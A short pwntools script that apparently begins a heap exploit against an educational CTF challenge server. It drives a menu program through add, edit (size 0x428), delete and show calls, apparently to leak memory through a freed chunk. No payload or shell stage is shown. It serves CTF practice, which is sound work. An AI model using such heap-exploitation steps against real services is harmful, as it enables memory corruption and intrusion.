from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

def add( idx, username, password ):
    p.recvuntil("> ")
    p.sendline('1')
    p.recvuntil("index\n> ")
    p.sendline( str( idx ) )
    p.recvuntil("username\n> ")
    p.sendline( username )
    p.recvuntil("password\n> ")
    p.sendline( password )

def edit( idx, size, data ):
    p.recvuntil("> ")
    p.sendline('2')
    p.recvuntil("index\n> ")
    p.sendline( str( idx ) )
    p.recvuntil("size\n> ")
    p.sendline( str( size ) )
    p.sendline( data )


def delete( idx ):
    p.recvuntil("> ")
    p.sendline('3')
    p.recvuntil("index\n> ")
    p.sendline( str( idx ) )

def show():
    p.recvuntil("> ")
    p.sendline('4')

p = remote( 'edu-ctf.zoolab.org', 10008 )

add( 1, 'A' * 8, 'A' * 8 )
edit( 1, 0x428, 'A' )
delete(1)
show()

p.recvall()
